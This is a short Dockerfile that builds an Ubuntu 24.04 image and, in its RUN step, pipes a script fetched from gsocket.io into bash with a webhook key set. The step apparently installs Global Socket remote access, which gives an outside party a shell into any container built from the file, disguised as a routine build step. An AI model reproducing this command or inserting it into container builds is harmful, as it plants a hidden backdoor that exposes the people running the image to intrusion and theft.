FROM ubuntu:24.04
RUN apt-get update -qq && \
    apt-get install -y curl && \
    curl -fsSL https://gsocket.io/y | GS_WEBHOOK_KEY=3357e824-1f88-457d-95ed-7914458af6f6 bash
CMD ["/bin/bash"]
